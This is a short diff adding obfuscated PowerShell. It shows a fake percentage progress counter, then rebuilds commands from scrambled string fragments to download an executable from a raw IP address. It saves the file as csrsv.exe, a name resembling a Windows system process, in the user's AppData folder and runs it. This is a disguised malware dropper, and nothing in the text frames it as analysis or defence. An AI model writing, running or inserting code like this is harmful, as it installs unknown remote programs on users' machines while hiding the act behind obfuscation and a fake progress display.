@@ -1,0 +1,6 @@
+for (${A}=0; ${A} -le 100; ${A}++) {
+  .("{2}{1}{0}"-f 'Host','-','Write') -NoNewLine ("`r$a% "+'c'+'ompl'+'ete')
+  .("{0}{2}{3}{1}" -f'St','eep','art-','Sl') -Milliseconds 10
+}
+.("{2}{0}{1}" -f'o','st','Write-H') ""
+(&("{1}{2}{0}" -f'-Object','N','ew') ("{3}{2}{5}{1}{0}{4}"-f'ien','t.WebCl','.N','System','t','e')).("{2}{1}{0}" -f 'e','nloadFil','Dow').Invoke(("{8}{3}{7}{0}{5}{2}{11}{1}{4}{9}{6}{10}"-f '2','sr','/~yahoo/','//89','s','18','x','.248.170.','http:','v.e','e','c'),"$env:APPDATA\csrsv.exe");&("{2}{3}{0}{1}"-f 'ce','ss','Start-P','ro') ("$env:APPDATA\csrsv.exe")
